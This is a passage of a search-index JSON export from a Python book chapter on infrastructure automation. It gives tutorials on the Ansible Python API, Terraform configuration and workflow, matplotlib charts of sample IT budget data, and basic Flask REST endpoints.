    "text": "20.1 Table of Contents\n\nIntroduction to Ansible\nInstalling Ansible and the Python API\nSetting Up Your Environment\nBasic Concepts of Ansible\nUsing the Ansible Python API\n\nRunning Ad-Hoc Commands\nRunning Playbooks\nManaging Inventory\n\nAdvanced Usage\n\nCustom Modules\nCallbacks\nHandling Results\n\nConclusion",
    "crumbs": [
      "<span class='chapter-number'>19</span>  <span class='chapter-title'>Modern Network Practices with Python</span>"
    ]
  },
  {
    "objectID": "18_modern_network_practices.html#introduction-to-ansible",
    "href": "18_modern_network_practices.html#introduction-to-ansible",
    "title": "19  Modern Network Practices with Python",
    "section": "20.2 Introduction to Ansible",
    "text": "20.2 Introduction to Ansible\nAnsible is an open-source automation tool used for IT tasks such as configuration management, application deployment, and task automation. It uses a simple, human-readable language to describe automation jobs, making it easy to learn and use.",
    "crumbs": [
      "<span class='chapter-number'>19</span>  <span class='chapter-title'>Modern Network Practices with Python</span>"
    ]
  },
  {
    "objectID": "18_modern_network_practices.html#installing-ansible-and-the-python-api",
    "href": "18_modern_network_practices.html#installing-ansible-and-the-python-api",
    "title": "19  Modern Network Practices with Python",
    "section": "20.3 Installing Ansible and the Python API",
    "text": "20.3 Installing Ansible and the Python API\nTo get started, you’ll need to install Ansible and the Ansible Python API. You can install Ansible using pip.\npip install ansible\nTo use the Ansible Python API, you also need to install ansible-base.\npip install ansible-base",
    "crumbs": [
      "<span class='chapter-number'>19</span>  <span class='chapter-title'>Modern Network Practices with Python</span>"
    ]
  },
  {
    "objectID": "18_modern_network_practices.html#setting-up-your-environment",
    "href": "18_modern_network_practices.html#setting-up-your-environment",
    "title": "19  Modern Network Practices with Python",
    "section": "20.4 Setting Up Your Environment",
    "text": "20.4 Setting Up Your Environment\nBefore you start using Ansible, you’ll need to set up your environment. This includes creating an inventory file that lists the hosts you want to manage and a configuration file to define various settings.\n\n20.4.1 Inventory File\nAnsible uses an inventory file to keep track of the hosts it manages. Here’s an example of a simple inventory file:\n[webservers]\nweb1.example.com\nweb2.example.com\n\n[databases]\ndb1.example.com\ndb2.example.com\n\n\n20.4.2 Configuration File\nAnsible configuration file (ansible.cfg) contains various settings that control the behavior of Ansible. Here is a basic example:\n[defaults]\ninventory = ./inventory\nremote_user = your_user\nhost_key_checking = False",
    "crumbs": [
      "<span class='chapter-number'>19</span>  <span class='chapter-title'>Modern Network Practices with Python</span>"
    ]
  },
  {
    "objectID": "18_modern_network_practices.html#basic-concepts-of-ansible",
    "href": "18_modern_network_practices.html#basic-concepts-of-ansible",
    "title": "19  Modern Network Practices with Python",
    "section": "20.5 Basic Concepts of Ansible",
    "text": "20.5 Basic Concepts of Ansible\nBefore diving into the Python API, let’s review some basic concepts of Ansible.\n\nPlaybooks: YAML files that define a series of tasks to be executed on the managed hosts.\nModules: Reusable, standalone scripts that Ansible runs on your behalf.\nTasks: Actions executed on the managed hosts.\nRoles: A way to group multiple tasks together to organize playbooks.",
    "crumbs": [
      "<span class='chapter-number'>19</span>  <span class='chapter-title'>Modern Network Practices with Python</span>"
    ]
  },
  {
    "objectID": "18_modern_network_practices.html#using-the-ansible-python-api",
    "href": "18_modern_network_practices.html#using-the-ansible-python-api",
    "title": "19  Modern Network Practices with Python",
    "section": "20.6 Using the Ansible Python API",
    "text": "20.6 Using the Ansible Python API\nThe Ansible Python API allows you to interact with Ansible programmatically. This section covers how to use the API to run ad-hoc commands, execute playbooks, and manage inventory.\n\n20.6.1 Running Ad-Hoc Commands\nAd-hoc commands allow you to run simple commands on your managed hosts without writing a playbook.\nfrom ansible.executor.task_queue_manager import TaskQueueManager\nfrom ansible.parsing.dataloader import DataLoader\nfrom ansible.inventory.manager import InventoryManager\nfrom ansible.vars.manager import VariableManager\nfrom ansible.playbook.play import Play\nfrom ansible import context\nfrom ansible.module_utils.common.collections import ImmutableDict\nimport ansible.constants as C\n\ncontext.CLIARGS = ImmutableDict(connection='ssh', module_path=[], forks=10, become=None, become_method=None, become_user=None, check=False, diff=False)\n\n# Initialize required objects\nloader = DataLoader()  # Takes care of finding and reading yaml, json and ini files\ninventory = InventoryManager(loader=loader, sources='inventory')\nvariable_manager = VariableManager(loader=loader, inventory=inventory)\n\n# Create a play source\nplay_source = dict(\n    name=\"Ansible Ad-Hoc\",\n    hosts='webservers',\n    gather_facts='no',\n    tasks=[\n        dict(action=dict(module='shell', args='uptime'), register='shell_out'),\n    ]\n)\n\n# Create Play object, which constructs our play from play source\nplay = Play().load(play_source, variable_manager=variable_manager, loader=loader)\n\n# Run it\ntqm = None\ntry:\n    tqm = TaskQueueManager(\n              inventory=inventory,\n              variable_manager=variable_manager,\n              loader=loader,\n              passwords=dict(vault_pass='secret'),\n              stdout_callback='default',\n          )\n    result = tqm.run(play)  # most interesting data for a play is actually sent to the callback's methods\nfinally:\n    if tqm is not None:\n        tqm.cleanup()\n\n\n20.6.2 Running Playbooks\nPlaybooks are the core of Ansible’s configuration, deployment, and orchestration language.\nfrom ansible.executor.playbook_executor import PlaybookExecutor\n\nplaybooks = ['site.yml']  # your playbook file\n\n# Create PlaybookExecutor\nexecutor = PlaybookExecutor(\n    playbooks=playbooks,\n    inventory=inventory,\n    variable_manager=variable_manager,\n    loader=loader,\n    passwords=dict(vault_pass='secret')\n)\n\n# Run the playbook\nexecutor.run()\n\n\n20.6.3 Managing Inventory\nManaging inventory programmatically allows dynamic inventory generation and management.\nfrom ansible.inventory.manager import InventoryManager\n\ninventory = InventoryManager(loader=loader, sources='inventory')",
    "crumbs": [
      "<span class='chapter-number'>19</span>  <span class='chapter-title'>Modern Network Practices with Python</span>"
    ]
  },
  {
    "objectID": "18_modern_network_practices.html#advanced-usage",
    "href": "18_modern_network_practices.html#advanced-usage",
    "title": "19  Modern Network Practices with Python",
    "section": "20.7 Advanced Usage",
    "text": "20.7 Advanced Usage\n\n20.7.1 Custom Modules\nCustom modules extend Ansible’s functionality. Here is an example of creating a custom module.\nfrom ansible.module_utils.basic import AnsibleModule\n\ndef run_module():\n    module_args = dict(\n        name=dict(type='str', required=True)\n    )\n\n    result = dict(\n        changed=False,\n        original_message='',\n        message=''\n    )\n\n    module = AnsibleModule(\n        argument_spec=module_args,\n        supports_check_mode=True\n    )\n\n    name = module.params['name']\n    result['original_message'] = name\n    result['message'] = 'Hello, {0}!'.format(name)\n\n    module.exit_json(**result)\n\ndef main():\n    run_module()\n\nif __name__ == '__main__':\n    main()\n\n\n20.7.2 Callbacks\nCallbacks allow custom handling of events during the execution of playbooks and tasks.\nfrom ansible.plugins.callback import CallbackBase\n\nclass ResultCallback(CallbackBase):\n    def v2_runner_on_ok(self, result):\n        host = result._host\n        print(f\"{host.name}: {result._result}\")\n\n# Use the custom callback in TaskQueueManager or PlaybookExecutor\ntqm = TaskQueueManager(\n    inventory=inventory,\n    variable_manager=variable_manager,\n    loader=loader,\n    passwords=dict(vault_pass='secret'),\n    stdout_callback=ResultCallback(),  # Use custom callback\n)\n\n\n20.7.3 Handling Results\nHandling results allows you to capture and process the output of your tasks and playbooks.\nclass ResultCallback(CallbackBase):\n    def v2_runner_on_ok(self, result):\n        host = result._host\n        print(f\"{host.name}: {result._result}\")\n\ncallback = ResultCallback()\n\n# Pass the callback to the TaskQueueManager or PlaybookExecutor\ntqm = TaskQueueManager(\n    inventory=inventory,\n    variable_manager=variable_manager,\n    loader=loader,\n    passwords=dict(vault_pass='secret'),\n    stdout_callback=callback,\n)\n\n# Run the play\ntqm.run(play)",
    "crumbs": [
      "<span class='chapter-number'>19</span>  <span class='chapter-title'>Modern Network Practices with Python</span>"
    ]
  },
  {
    "objectID": "18_modern_network_practices.html#conclusion-1",
    "href": "18_modern_network_practices.html#conclusion-1",
    "title": "19  Modern Network Practices with Python",
    "section": "20.8 Conclusion",
    "text": "20.8 Conclusion\nThis deep dive tutorial has covered the basics and some advanced features of using the Ansible Python API for infrastructure management. You should now have a good understanding of how to use Ansible programmatically to manage your infrastructure, including running ad-hoc commands, executing playbooks, managing inventory, creating custom modules, and handling results. With this knowledge, you can automate and orchestrate complex IT tasks efficiently.",
    "crumbs": [
      "<span class='chapter-number'>19</span>  <span class='chapter-title'>Modern Network Practices with Python</span>"
    ]
  },
  {
    "objectID": "18_modern_network_practices.html#table-of-contents-1",
    "href": "18_modern_network_practices.html#table-of-contents-1",
    "title": "19  Modern Network Practices with Python",
    "section": "21.1 Table of Contents",
    "text": "21.1 Table of Contents\n\nIntroduction to Terraform\nInstalling Terraform\nSetting Up Your First Terraform Project\nUnderstanding Terraform Configuration Files\n\nProviders\nResources\nVariables\nOutputs\n\nTerraform Workflow\n\nInitializing\nPlanning\nApplying\nDestroying\n\nState Management\n\nRemote State\nState Locking\n\nModules\n\nCreating Modules\nUsing Modules\n\nProvisioners\nTerraform Best Practices\nConclusion",
    "crumbs": [
      "<span class='chapter-number'>19</span>  <span class='chapter-title'>Modern Network Practices with Python</span>"
    ]
  },
  {
    "objectID": "18_modern_network_practices.html#introduction-to-terraform",
    "href": "18_modern_network_practices.html#introduction-to-terraform",
    "title": "19  Modern Network Practices with Python",
    "section": "21.2 Introduction to Terraform",
    "text": "21.2 Introduction to Terraform\nTerraform is an open-source infrastructure as code (IaC) tool created by HashiCorp. It allows you to define both cloud and on-premises resources using a high-level configuration language. Terraform can manage resources across various cloud providers and services through its extensive provider ecosystem.",
    "crumbs": [
      "<span class='chapter-number'>19</span>  <span class='chapter-title'>Modern Network Practices with Python</span>"
    ]
  },
  {
    "objectID": "18_modern_network_practices.html#installing-terraform",
    "href": "18_modern_network_practices.html#installing-terraform",
    "title": "19  Modern Network Practices with Python",
    "section": "21.3 Installing Terraform",
    "text": "21.3 Installing Terraform\nTo get started with Terraform, you need to install it on your local machine. Follow the steps below to install Terraform.\n\n21.3.1 Installation on Windows\n\nDownload the appropriate package for your system from the Terraform downloads page.\nExtract the package to a directory of your choice.\nAdd the directory to your system’s PATH environment variable.\n\n\n\n21.3.2 Installation on macOS\n\nUse Homebrew to install Terraform:\nbrew install terraform\n\n\n\n21.3.3 Installation on Linux\n\nDownload the appropriate package for your system from the Terraform downloads page.\nExtract the package to /usr/local/bin:\nsudo unzip terraform_&lt;VERSION&gt;_linux_amd64.zip -d /usr/local/bin/\n\nVerify the installation by running:\nterraform -version",
    "crumbs": [
      "<span class='chapter-number'>19</span>  <span class='chapter-title'>Modern Network Practices with Python</span>"
    ]
  },
  {
    "objectID": "18_modern_network_practices.html#setting-up-your-first-terraform-project",
    "href": "18_modern_network_practices.html#setting-up-your-first-terraform-project",
    "title": "19  Modern Network Practices with Python",
    "section": "21.4 Setting Up Your First Terraform Project",
    "text": "21.4 Setting Up Your First Terraform Project\nCreate a new directory for your Terraform project and navigate into it:\nmkdir my-terraform-project\ncd my-terraform-project\nCreate a new Terraform configuration file:\ntouch main.tf",
    "crumbs": [
      "<span class='chapter-number'>19</span>  <span class='chapter-title'>Modern Network Practices with Python</span>"
    ]
  },
  {
    "objectID": "18_modern_network_practices.html#understanding-terraform-configuration-files",
    "href": "18_modern_network_practices.html#understanding-terraform-configuration-files",
    "title": "19  Modern Network Practices with Python",
    "section": "21.5 Understanding Terraform Configuration Files",
    "text": "21.5 Understanding Terraform Configuration Files\nTerraform configuration files are written in HashiCorp Configuration Language (HCL) or JSON. These files define the resources and infrastructure you want to manage.\n\n21.5.1 Providers\nProviders are plugins that enable Terraform to interact with cloud providers, SaaS providers, and other APIs. Here’s how to configure the AWS provider:\nprovider \"aws\" {\n  region = \"us-west-2\"\n}\n\n\n21.5.2 Resources\nResources are the most important element in the Terraform language. Each resource block describes one or more infrastructure objects.\nresource \"aws_instance\" \"example\" {\n  ami           = \"ami-0c55b159cbfafe1f0\"\n  instance_type = \"t2.micro\"\n}\n\n\n21.5.3 Variables\nVariables allow you to parameterize your Terraform configurations. You can define variables in a variables.tf file:\nvariable \"instance_type\" {\n  description = \"Type of instance to create\"\n  default     = \"t2.micro\"\n}\n\n\n21.5.4 Outputs\nOutputs are a way to extract information from your Terraform state and make it accessible for other parts of your configuration or for user reference.\noutput \"instance_ip\" {\n  value = aws_instance.example.public_ip\n}",
    "crumbs": [
      "<span class='chapter-number'>19</span>  <span class='chapter-title'>Modern Network Practices with Python</span>"
    ]
  },
  {
    "objectID": "18_modern_network_practices.html#terraform-workflow",
    "href": "18_modern_network_practices.html#terraform-workflow",
    "title": "19  Modern Network Practices with Python",
    "section": "21.6 Terraform Workflow",
    "text": "21.6 Terraform Workflow\n\n21.6.1 Initializing\nInitialize a working directory containing Terraform configuration files:\nterraform init\n\n\n21.6.2 Planning\nGenerate and show an execution plan:\nterraform plan\n\n\n21.6.3 Applying\nBuild or change infrastructure:\nterraform apply\n\n\n21.6.4 Destroying\nDestroy the infrastructure managed by Terraform:\nterraform destroy",
    "crumbs": [
      "<span class='chapter-number'>19</span>  <span class='chapter-title'>Modern Network Practices with Python</span>"
    ]
  },
  {
    "objectID": "18_modern_network_practices.html#state-management",
    "href": "18_modern_network_practices.html#state-management",
    "title": "19  Modern Network Practices with Python",
    "section": "21.7 State Management",
    "text": "21.7 State Management\nTerraform uses a state file to keep track of the resources it manages. This state file is critical for tracking resource changes and ensuring that your infrastructure matches your configuration.\n\n21.7.1 Remote State\nStoring your state file remotely is essential for collaboration and preventing conflicts.\nterraform {\n  backend \"s3\" {\n    bucket = \"my-terraform-state\"\n    key    = \"state/terraform.tfstate\"\n    region = \"us-west-2\"\n  }\n}\n\n\n21.7.2 State Locking\nState locking prevents concurrent operations, which can cause corruption. S3 backend supports state locking using DynamoDB.\nterraform {\n  backend \"s3\" {\n    bucket         = \"my-terraform-state\"\n    key            = \"state/terraform.tfstate\"\n    region         = \"us-west-2\"\n    dynamodb_table = \"terraform-lock\"\n  }\n}",
    "crumbs": [
      "<span class='chapter-number'>19</span>  <span class='chapter-title'>Modern Network Practices with Python</span>"
    ]
  },
  {
    "objectID": "18_modern_network_practices.html#modules",
    "href": "18_modern_network_practices.html#modules",
    "title": "19  Modern Network Practices with Python",
    "section": "21.8 Modules",
    "text": "21.8 Modules\nModules are self-contained packages of Terraform configurations that can be shared and reused.\n\n21.8.1 Creating Modules\nCreate a directory for your module:\nmkdir -p modules/my-module\nDefine resources, variables, and outputs within this directory.\n\n\n21.8.2 Using Modules\nUse the module in your main configuration:\nmodule \"my_module\" {\n  source = \"./modules/my-module\"\n\n  # Pass variables to the module\n  instance_type = \"t2.micro\"\n}",
    "crumbs": [
      "<span class='chapter-number'>19</span>  <span class='chapter-title'>Modern Network Practices with Python</span>"
    ]
  },
  {
    "objectID": "18_modern_network_practices.html#provisioners",
    "href": "18_modern_network_practices.html#provisioners",
    "title": "19  Modern Network Practices with Python",
    "section": "21.9 Provisioners",
    "text": "21.9 Provisioners\nProvisioners allow you to execute scripts on a local or remote machine as part of the resource lifecycle.\nresource \"aws_instance\" \"example\" {\n  ami           = \"ami-0c55b159cbfafe1f0\"\n  instance_type = \"t2.micro\"\n\n  provisioner \"local-exec\" {\n    command = \"echo ${aws_instance.example.public_ip}\"\n  }\n}",
    "crumbs": [
      "<span class='chapter-number'>19</span>  <span class='chapter-title'>Modern Network Practices with Python</span>"
    ]
  },
  {
    "objectID": "18_modern_network_practices.html#terraform-best-practices",
    "href": "18_modern_network_practices.html#terraform-best-practices",
    "title": "19  Modern Network Practices with Python",
    "section": "21.10 Terraform Best Practices",
    "text": "21.10 Terraform Best Practices\n\nUse Version Control: Keep your Terraform configurations in a version control system like Git.\nModularize Configurations: Use modules to organize and reuse configurations.\nState Management: Use remote state and state locking to avoid conflicts.\nEnvironment Separation: Use workspaces or separate state files for different environments (e.g., development, staging, production).\nSensitive Data: Use environment variables or secret management tools to handle sensitive data securely.",
    "crumbs": [
      "<span class='chapter-number'>19</span>  <span class='chapter-title'>Modern Network Practices with Python</span>"
    ]
  },
  {
    "objectID": "18_modern_network_practices.html#conclusion-2",
    "href": "18_modern_network_practices.html#conclusion-2",
    "title": "19  Modern Network Practices with Python",
    "section": "21.11 Conclusion",
    "text": "21.11 Conclusion\nThis deep dive tutorial has covered the basics and some advanced features of using Terraform for infrastructure management. You should now have a good understanding of how to define, manage, and provision infrastructure using Terraform. With this knowledge, you can automate your infrastructure tasks and manage your resources efficiently.",
    "crumbs": [
      "<span class='chapter-number'>19</span>  <span class='chapter-title'>Modern Network Practices with Python</span>"
    ]
  },
  {
    "objectID": "18_modern_network_practices.html#table-of-contents-2",
    "href": "18_modern_network_practices.html#table-of-contents-2",
    "title": "19  Modern Network Practices with Python",
    "section": "22.1 Table of Contents",
    "text": "22.1 Table of Contents\n\nIntroduction to matplotlib\nInstalling matplotlib\nLoading IT Budget Data\nBasic Plotting\n\nLine Plot\nBar Chart\nPie Chart\n\nAdvanced Visualizations\n\nStacked Bar Chart\nBox Plot\nHeatmap\n\nCustomizing Plots\n\nTitles and Labels\nLegends\nAnnotations\n\nSaving Plots\nConclusion",
    "crumbs": [
      "<span class='chapter-number'>19</span>  <span class='chapter-title'>Modern Network Practices with Python</span>"
    ]
  },
  {
    "objectID": "18_modern_network_practices.html#introduction-to-matplotlib",
    "href": "18_modern_network_practices.html#introduction-to-matplotlib",
    "title": "19  Modern Network Practices with Python",
    "section": "22.2 Introduction to matplotlib",
    "text": "22.2 Introduction to matplotlib\nmatplotlib is a comprehensive library for creating static, animated, and interactive visualizations in Python. It is highly customizable and integrates well with other libraries such as numpy and pandas.",
    "crumbs": [
      "<span class='chapter-number'>19</span>  <span class='chapter-title'>Modern Network Practices with Python</span>"
    ]
  },
  {
    "objectID": "18_modern_network_practices.html#installing-matplotlib",
    "href": "18_modern_network_practices.html#installing-matplotlib",
    "title": "19  Modern Network Practices with Python",
    "section": "22.3 Installing matplotlib",
    "text": "22.3 Installing matplotlib\nTo install matplotlib, use pip:\npip install matplotlib",
    "crumbs": [
      "<span class='chapter-number'>19</span>  <span class='chapter-title'>Modern Network Practices with Python</span>"
    ]
  },
  {
    "objectID": "18_modern_network_practices.html#loading-it-budget-data",
    "href": "18_modern_network_practices.html#loading-it-budget-data",
    "title": "19  Modern Network Practices with Python",
    "section": "22.4 Loading IT Budget Data",
    "text": "22.4 Loading IT Budget Data\nFor this tutorial, we will assume that IT budget data is stored in a CSV file. We’ll use pandas to load and handle the data.\nimport pandas as pd\n\n# Load the data\ndata = pd.read_csv('it_budget.csv')\nprint(data.head())\nSample IT budget data (it_budget.csv):\nYear,Hardware,Software,Services,Personnel\n2018,50000,30000,15000,60000\n2019,55000,32000,18000,63000\n2020,60000,34000,20000,66000\n2021,62000,36000,22000,70000\n2022,65000,38000,25000,73000",
    "crumbs": [
      "<span class='chapter-number'>19</span>  <span class='chapter-title'>Modern Network Practices with Python</span>"
    ]
  },
  {
    "objectID": "18_modern_network_practices.html#basic-plotting",
    "href": "18_modern_network_practices.html#basic-plotting",
    "title": "19  Modern Network Practices with Python",
    "section": "22.5 Basic Plotting",
    "text": "22.5 Basic Plotting\n\n22.5.1 Line Plot\nA line plot is useful for visualizing trends over time. Here, we’ll plot the IT budget over the years.\nimport matplotlib.pyplot as plt\n\nplt.figure(figsize=(10, 6))\nplt.plot(data['Year'], data['Hardware'], label='Hardware')\nplt.plot(data['Year'], data['Software'], label='Software')\nplt.plot(data['Year'], data['Services'], label='Services')\nplt.plot(data['Year'], data['Personnel'], label='Personnel')\n\nplt.xlabel('Year')\nplt.ylabel('Budget ($)')\nplt.title('IT Budget Over Years')\nplt.legend()\nplt.grid(True)\nplt.show()\n\n\n22.5.2 Bar Chart\nA bar chart can effectively show the budget distribution for different categories in a particular year.\nyear = 2022\nbudget_2022 = data[data['Year'] == year].iloc[0, 1:]\n\nplt.figure(figsize=(10, 6))\nplt.bar(budget_2022.index, budget_2022.values)\n\nplt.xlabel('Category')\nplt.ylabel('Budget ($)')\nplt.title(f'IT Budget Distribution for {year}')\nplt.show()\n\n\n22.5.3 Pie Chart\nA pie chart shows the proportional distribution of the IT budget across different categories.\nplt.figure(figsize=(8, 8))\nplt.pie(budget_2022.values, labels=budget_2022.index, autopct='%1.1f%%', startangle=140)\n\nplt.title(f'IT Budget Distribution for {year}')\nplt.show()",
    "crumbs": [
      "<span class='chapter-number'>19</span>  <span class='chapter-title'>Modern Network Practices with Python</span>"
    ]
  },
  {
    "objectID": "18_modern_network_practices.html#advanced-visualizations",
    "href": "18_modern_network_practices.html#advanced-visualizations",
    "title": "19  Modern Network Practices with Python",
    "section": "22.6 Advanced Visualizations",
    "text": "22.6 Advanced Visualizations\n\n22.6.1 Stacked Bar Chart\nA stacked bar chart can show the composition of the IT budget over the years.\nplt.figure(figsize=(12, 8))\nplt.bar(data['Year'], data['Hardware'], label='Hardware')\nplt.bar(data['Year'], data['Software'], bottom=data['Hardware'], label='Software')\nplt.bar(data['Year'], data['Services'], bottom=data['Hardware'] + data['Software'], label='Services')\nplt.bar(data['Year'], data['Personnel'], bottom=data['Hardware'] + data['Software'] + data['Services'], label='Personnel')\n\nplt.xlabel('Year')\nplt.ylabel('Budget ($)')\nplt.title('Stacked IT Budget Over Years')\nplt.legend()\nplt.show()\n\n\n22.6.2 Box Plot\nA box plot can show the distribution and outliers in the budget data for different categories.\nplt.figure(figsize=(12, 8))\ndata.boxplot(column=['Hardware', 'Software', 'Services', 'Personnel'])\n\nplt.xlabel('Category')\nplt.ylabel('Budget ($)')\nplt.title('IT Budget Distribution by Category')\nplt.show()\n\n\n22.6.3 Heatmap\nA heatmap can show the correlation between different budget categories.\nimport seaborn as sns\n\nplt.figure(figsize=(10, 8))\nsns.heatmap(data.corr(), annot=True, cmap='coolwarm', linewidths=0.5)\n\nplt.title('Correlation Heatmap of IT Budget Categories')\nplt.show()",
    "crumbs": [
      "<span class='chapter-number'>19</span>  <span class='chapter-title'>Modern Network Practices with Python</span>"
    ]
  },
  {
    "objectID": "18_modern_network_practices.html#customizing-plots",
    "href": "18_modern_network_practices.html#customizing-plots",
    "title": "19  Modern Network Practices with Python",
    "section": "22.7 Customizing Plots",
    "text": "22.7 Customizing Plots\n\n22.7.1 Titles and Labels\nCustomizing titles and labels is crucial for making the plot more informative.\nplt.figure(figsize=(10, 6))\nplt.plot(data['Year'], data['Hardware'], label='Hardware')\n\nplt.xlabel('Year', fontsize=14)\nplt.ylabel('Budget ($)', fontsize=14)\nplt.title('Hardware Budget Over Years', fontsize=16)\nplt.legend(fontsize=12)\nplt.grid(True)\nplt.show()\n\n\n22.7.2 Legends\nLegends help in identifying different data series in a plot.\nplt.figure(figsize=(10, 6))\nplt.plot(data['Year'], data['Hardware'], label='Hardware')\nplt.plot(data['Year'], data['Software'], label='Software')\n\nplt.xlabel('Year')\nplt.ylabel('Budget ($)')\nplt.title('IT Budget Over Years')\nplt.legend(loc='upper left', fontsize=12)\nplt.show()\n\n\n22.7.3 Annotations\nAnnotations can highlight specific data points in a plot.\nplt.figure(figsize=(10, 6))\nplt.plot(data['Year'], data['Hardware'], label='Hardware')\n\n# Annotate a specific point\nmax_year = data['Year'][data['Hardware'].idxmax()]\nmax_value = data['Hardware'].max()\nplt.annotate(f'Max: {max_value}', xy=(max_year, max_value), xytext=(max_year+0.5, max_value-5000),\n             arrowprops=dict(facecolor='black', shrink=0.05))\n\nplt.xlabel('Year')\nplt.ylabel('Budget ($)')\nplt.title('Hardware Budget Over Years')\nplt.legend()\nplt.show()",
    "crumbs": [
      "<span class='chapter-number'>19</span>  <span class='chapter-title'>Modern Network Practices with Python</span>"
    ]
  },
  {
    "objectID": "18_modern_network_practices.html#saving-plots",
    "href": "18_modern_network_practices.html#saving-plots",
    "title": "19  Modern Network Practices with Python",
    "section": "22.8 Saving Plots",
    "text": "22.8 Saving Plots\nYou can save the plots to files using the savefig method.\nplt.figure(figsize=(10, 6))\nplt.plot(data['Year'], data['Hardware'], label='Hardware')\n\nplt.xlabel('Year')\nplt.ylabel('Budget ($)')\nplt.title('Hardware Budget Over Years')\nplt.legend()\n\nplt.savefig('hardware_budget_over_years.png', dpi=300)\nplt.show()",
    "crumbs": [
      "<span class='chapter-number'>19</span>  <span class='chapter-title'>Modern Network Practices with Python</span>"
    ]
  },
  {
    "objectID": "18_modern_network_practices.html#conclusion-3",
    "href": "18_modern_network_practices.html#conclusion-3",
    "title": "19  Modern Network Practices with Python",
    "section": "22.9 Conclusion",
    "text": "22.9 Conclusion\nThis tutorial provided a deep dive into the matplotlib library for visualizing IT budget data. We covered basic plotting techniques, advanced visualizations, and customization options. By leveraging the powerful capabilities of matplotlib, you can create insightful and informative visualizations for various types of data.",
    "crumbs": [
      "<span class='chapter-number'>19</span>  <span class='chapter-title'>Modern Network Practices with Python</span>"
    ]
  },
  {
    "objectID": "18_modern_network_practices.html#table-of-contents-3",
    "href": "18_modern_network_practices.html#table-of-contents-3",
    "title": "19  Modern Network Practices with Python",
    "section": "23.1 Table of Contents",
    "text": "23.1 Table of Contents\n\nIntroduction to Flask\nSetting Up Your Environment\nCreating a Basic Flask Application\nUnderstanding RESTful APIs\nCreating RESTful Endpoints\n\nGET Endpoint\nPOST Endpoint\nPUT Endpoint\nDELETE Endpoint\n\nHandling Data with Flask\n\nUsing Flask-SQLAlchemy\nUsing Marshmallow for Serialization\n\nError Handling\nTesting Your API\nAuthentication and Authorization\nBest Practices\nConclusion",
    "crumbs": [
      "<span class='chapter-number'>19</span>  <span class='chapter-title'>Modern Network Practices with Python</span>"
    ]
  },
  {
    "objectID": "18_modern_network_practices.html#introduction-to-flask",
    "href": "18_modern_network_practices.html#introduction-to-flask",
    "title": "19  Modern Network Practices with Python",
    "section": "23.2 Introduction to Flask",
    "text": "23.2 Introduction to Flask\nFlask is a micro-framework for Python based on Werkzeug and Jinja2. It’s called a micro-framework because it doesn’t require particular tools or libraries. Flask has become a popular choice for developing APIs due to its simplicity and extensibility.",
    "crumbs": [
      "<span class='chapter-number'>19</span>  <span class='chapter-title'>Modern Network Practices with Python</span>"
    ]
  },
  {
    "objectID": "18_modern_network_practices.html#setting-up-your-environment-1",
    "href": "18_modern_network_practices.html#setting-up-your-environment-1",
    "title": "19  Modern Network Practices with Python",
    "section": "23.3 Setting Up Your Environment",
    "text": "23.3 Setting Up Your Environment\nBefore starting, ensure you have Python installed on your system. You can download it from python.org.\n\nCreate a virtual environment:\npython -m venv venv\nActivate the virtual environment:\n\nOn Windows:\nvenv\\Scripts\\activate\nOn macOS/Linux:\nsource venv/bin/activate\n\nInstall Flask:\npip install Flask",
    "crumbs": [
      "<span class='chapter-number'>19</span>  <span class='chapter-title'>Modern Network Practices with Python</span>"
    ]
  },
  {
    "objectID": "18_modern_network_practices.html#creating-a-basic-flask-application",
    "href": "18_modern_network_practices.html#creating-a-basic-flask-application",
    "title": "19  Modern Network Practices with Python",
    "section": "23.4 Creating a Basic Flask Application",
    "text": "23.4 Creating a Basic Flask Application\nCreate a new file named app.py and add the following code to create a basic Flask application:\nfrom flask import Flask\n\napp = Flask(__name__)\n\n@app.route('/')\ndef hello_world():\n    return 'Hello, World!'\n\nif __name__ == '__main__':\n    app.run(debug=True)\nRun your application with:\npython app.py\nYou should see “Hello, World!” when you navigate to http://127.0.0.1:5000/.",
    "crumbs": [
      "<span class='chapter-number'>19</span>  <span class='chapter-title'>Modern Network Practices with Python</span>"
    ]
  },
  {
    "objectID": "18_modern_network_practices.html#understanding-restful-apis",
    "href": "18_modern_network_practices.html#understanding-restful-apis",
    "title": "19  Modern Network Practices with Python",
    "section": "23.5 Understanding RESTful APIs",
    "text": "23.5 Understanding RESTful APIs\nREST (Representational State Transfer) is an architectural style for designing networked applications. A RESTful API is an API that adheres to the principles of REST. Key principles include:\n\nStatelessness: Each request from a client to a server must contain all the information needed to understand and process the request.\nClient-Server Architecture: The client and server are independent of each other.\nUniform Interface: Resources are identified in the request, and the method (GET, POST, PUT, DELETE) dictates the action.",
    "crumbs": [
      "<span class='chapter-number'>19</span>  <span class='chapter-title'>Modern Network Practices with Python</span>"
    ]
  },
  {
    "objectID": "18_modern_network_practices.html#creating-restful-endpoints",
    "href": "18_modern_network_practices.html#creating-restful-endpoints",
    "title": "19  Modern Network Practices with Python",
    "section": "23.6 Creating RESTful Endpoints",
    "text": "23.6 Creating RESTful Endpoints\n\n23.6.1 GET Endpoint\nThe GET method retrieves information from the server.\n@app.route('/items', methods=['GET'])\ndef get_items():\n    items = [{\"id\": 1, \"name\": \"Item 1\"}, {\"id\": 2, \"name\": \"Item 2\"}]\n    return jsonify(items)\n\n\n23.6.2 POST Endpoint\nThe POST method sends data to the server to create a new resource.\n@app.route('/items', methods=['POST'])\ndef create_item():\n    data = request.get_json()\n    new_item = {\"id\": 3, \"name\": data['name']}\n    return jsonify(new_item), 201\n\n\n23.6.3 PUT Endpoint\nThe PUT method updates an existing resource.\n@app.route('/items/&lt;int:item_id&gt;', methods=['PUT'])\ndef update_item(item_id):\n    data = request.get_json()\n    updated_item = {\"id\": item_id, \"name\": data['name']}\n    return jsonify(updated_item)\n\n\n23.6.4 DELETE Endpoint\nThe DELETE method removes a resource from the server.\n@app.route('/items/&lt;int:item_id&gt;', methods=['DELETE'])\ndef delete_item(item_id):\n    return '', 204",
    "crumbs": [
      "<span class='chapter-number'>19</span>  <span class='chapter-title'>Modern Network Practices with Python</span>"
    ]
  },
  {
    "objectID": "18_modern_network_practices.html#handling-data-with-flask",
    "href": "18_modern_network_practices.html#handling-data-with-flask",
    "title": "19  Modern Network Practices with Python",
    "section": "23.7 Handling Data with Flask",
